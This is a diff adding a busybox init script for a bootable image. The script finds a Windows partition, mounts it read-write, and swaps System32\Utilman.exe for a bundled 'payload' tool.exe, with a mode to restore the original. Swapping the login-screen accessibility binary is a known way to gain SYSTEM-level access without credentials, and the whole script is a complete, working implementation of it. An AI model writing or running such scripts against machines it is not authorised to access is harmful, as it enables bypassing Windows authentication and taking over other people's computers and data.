@@ -1,0 +1,115 @@
+#!/bin/busybox sh
+# install mode: swap Utilman.exe with payload tool.exe, keep original as Utilman.exe_bak
+# restore mode: move Utilman.exe_bak back to Utilman.exe
+export PATH=/bin
+CON=/dev/tty0
+
+say() { echo "$*" > "$CON" 2>/dev/null || true; }
+
+finish() {
+    busybox sync
+    busybox sleep 3
+    busybox reboot -f
+    while true; do busybox sleep 10; done
+}
+
+# base mounts
+busybox mount -t proc     proc     /proc 2>/dev/null
+busybox mount -t sysfs    sysfs    /sys  2>/dev/null
+busybox mount -t devtmpfs devtmpfs /dev  2>/dev/null
+busybox mount -t tmpfs    tmpfs    /run  2>/dev/null
+
+/anim/fbanim /anim/frames.bin &
+FBPID=$!
+
+# load kernel modules
+for m in nvme-auth nvme-core nvme scsi_common scsi_mod libata libahci ahci vmd ntfs3; do
+    [ -f "/modules/$m.ko" ] && insmod "/modules/$m.ko" 2>/dev/null
+done
+busybox sleep 2
+
+# case-insensitive path resolution under a mountpoint
+ci_resolve() {
+    cur="$1"; shift
+    for comp in "$@"; do
+        lc=$(echo "$comp" | tr 'A-Z' 'a-z')
+        match=""
+        for e in "$cur"/* "$cur"/.*; do
+            [ -e "$e" ] || continue
+            nm=$(busybox basename "$e")
+            [ "$nm" = "." ] || [ "$nm" = ".." ] && continue
+            ln=$(echo "$nm" | tr 'A-Z' 'a-z')
+            if [ "$ln" = "$lc" ]; then match="$e"; break; fi
+        done
+        [ -z "$match" ] && return 1
+        cur="$match"
+    done
+    echo "$cur"
+}
+
+# find windows partition (exactly one ntfs with System32\ntoskrnl.exe)
+MATCHES=""
+for d in /sys/class/block/*; do
+    [ -f "$d/partition" ] || continue
+    dev="/dev/$(busybox basename "$d")"
+    [ -b "$dev" ] || continue
+    busybox umount /mnt 2>/dev/null
+    if busybox mount -t ntfs3 -o ro "$dev" /mnt 2>/dev/null; then
+        if ci_resolve /mnt Windows System32 ntoskrnl.exe >/dev/null 2>&1; then
+            MATCHES="$MATCHES $dev"
+        fi
+        busybox umount /mnt 2>/dev/null
+    fi
+done
+MATCHES=$(echo "$MATCHES" | sed 's/^ *//')
+
+N=0
+for x in $MATCHES; do N=$((N+1)); done
+if [ "$N" -ne 1 ]; then
+    say "No single Windows partition found."
+    finish
+fi
+WIN="$MATCHES"
+
+busybox umount /mnt 2>/dev/null
+if ! busybox mount -t ntfs3 "$WIN" /mnt 2>/dev/null; then
+    say "Cannot mount $WIN read-write (BitLocker / fast-startup?)."
+    finish
+fi
+
+WROOT=$(ci_resolve /mnt Windows System32)
+if [ -z "$WROOT" ] || [ ! -d "$WROOT" ]; then
+    busybox umount /mnt 2>/dev/null
+    say "Windows\\System32 not found."
+    finish
+fi
+
+BAK=$(ci_resolve "$WROOT" "Utilman.exe_bak")
+UTIL=$(ci_resolve "$WROOT" "Utilman.exe")
+
+# pick mode and switch to mode-specific animation
+if [ -n "$BAK" ] && [ -f "$BAK" ]; then
+    MODE=restoring
+else
+    MODE=installing
+fi
+kill "$FBPID" 2>/dev/null
+wait "$FBPID" 2>/dev/null
+/anim/fbanim "/anim/frames_${MODE}.bin" &
+FBPID=$!
+
+# run the operation
+if [ "$MODE" = restoring ]; then
+    [ -n "$UTIL" ] && busybox rm -f "$UTIL" 2>/dev/null
+    busybox mv "$BAK" "$WROOT/Utilman.exe" 2>/dev/null
+else
+    if [ -n "$UTIL" ] && [ -f "$UTIL" ] && [ -f /payload/tool.exe ]; then
+        busybox cp -f "$UTIL" "$WROOT/Utilman.exe_bak" 2>/dev/null \
+            && busybox rm -f "$UTIL" 2>/dev/null \
+            && busybox cp -f /payload/tool.exe "$WROOT/Utilman.exe" 2>/dev/null
+    fi
+fi
+
+busybox sync
+busybox umount /mnt 2>/dev/null
+finish
